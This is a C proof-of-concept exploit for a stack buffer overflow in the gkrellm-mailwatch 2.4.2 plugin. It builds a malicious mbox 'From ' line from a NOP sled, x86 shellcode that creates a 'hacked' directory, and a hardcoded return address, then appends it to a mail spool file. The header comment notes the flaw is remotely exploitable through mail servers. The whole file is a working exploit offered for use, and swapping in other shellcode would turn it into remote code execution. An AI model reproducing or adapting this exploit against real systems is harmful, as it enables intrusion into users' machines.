/*
 * Proof of Concept code for a buffer overflow in  gkrellm plugin gkrellm-mailwatch 2.4.2
 *
 * Overflow occurs in when processing the "From " (not "From: ")
 * field of the email.  This is remotely exploitable if you can pass 
 * shellcode through the mail servers with out it getting foobar'ed
 * in the process.
 * 
 * Since this is just POC, this will create a directory called hacked in gkrellm's CWD.
 * 
 * One last note, it appends to the file you create, so feel free to append to
 * your /var/spool/mail entry.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define RET 0xbffff36d
#define NOP 0x90
#define LEN 520

/* Zillion's mkdir hacked from www.safemode.org */
char code[]=
        "\xeb\x16\x5e\x31\xc0\x88\x46\x06\xb0\x27\x8d\x1e\x66\xb9\xed"
        "\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x68"
        "\x61\x63\x6b\x65\x64\x23";


int main(int argc, char **argv) {
  int i = 0, offset = 0;
  char ch, *mfile = NULL, *p = NULL, buf[5 + LEN + 6 + 2 + 3 + 1 + 3 + 2 + 1 + 8 + 1 + 4 + 2];  // From %s@foo.bar  Thu Jun 26 16:45:16 2003\n\0
  long ret = RET, *paddr = NULL;
  FILE *fd;
  
  if(argc < 2) {
    fprintf(stderr, "usage: %s <-m outfile> [-o offset] [-h]\n", argv[0]);
    exit(1);
  }

  while((ch = getopt(argc, argv, "m:o:h")) != -1) {
    switch(ch) {
      case 'h':
        fprintf(stderr, "usage: %s <-m outfile> [-o offset] [-h]\n", argv[0]);
        exit(1);
      break;

      case 'o':
        ret -= atoi(optarg);
      break;

      case 'm':
        if(!(mfile = malloc(strlen(optarg)+1))) {
          perror("malloc");
          exit(1);
        }
        strcpy(mfile, optarg);
      break; 
    }
  }

  if(!mfile) {
    fprintf(stderr, "usage: %s <-m outfile> [-o offset] [-h]\n", argv[0]);
    exit(1);
  }

  fprintf(stderr, "[+] ret 0x%lx\n", ret);

  strcpy(buf, "From ");
  p = buf + 5;

  // nops
  for(i=0; i<LEN-strlen(code)-4; i++)
    *(p++) = NOP;

  // shellcode
  for(i=0; i<strlen(code); i++)
    *(p++) = code[i];

  // address
  paddr = (long *)p;
  for(i=0; i<4; i+=4)
    *(paddr++) = ret;

  // terminate and concatenate
  *(p+4) = 0;
  strcat(buf, "@foo.bar  Thu Jun 26 16:45:16 2003\n");
  
  // check for an outfile, otherwise send to stdout
  if(mfile) {
    if(!(fd = fopen(mfile, "a"))) {
      perror("fopen");
      exit(1);
    }
    fprintf(stderr, "[+] out %s\n", mfile);
  } else {
    fd = stdout;
    fprintf(stderr, "[+] out stdout\n");
  }

  fputs(buf, fd); 
  fputs("Return-Path: <root@foo.bar>\n", fd);
  fputs("Received: from localhost (localhost [127.0.0.1])", fd);
  fputs("\tby localhost (8.12.4/8.12.4) with ESMTP id h5QNPG2q003945\n", fd);
  fputs("\tfor <root@foo.bar>; Thu, 26 Jun 2003 16:45:16 -0700\n", fd);
  fputs("Received: (from root@foo.bar)\n", fd);
  fputs("\tby localhost (8.12.4/8.12.4/Submit) id h5QNPGuc004172\n", fd);
  fputs("\tfor root; Thu, 26 Jun 2003 16:45:16 -0700\n", fd);
  fputs("Date: Thu, 26 Jun 2003 16:45:12 -0700\n", fd);
  fputs("From: root@foo.bar\n", fd);
  fputs("Message-Id: <200306262325.h5QNPGuc003744@localhost>\n", fd);
  fputs("To: root@foo.bar\n", fd);
  fputs("Subject: foobar\n\n", fd);
  fputs("foobar\n\n", fd);

  fclose(fd);
  free(mfile);
  exit(0);
}
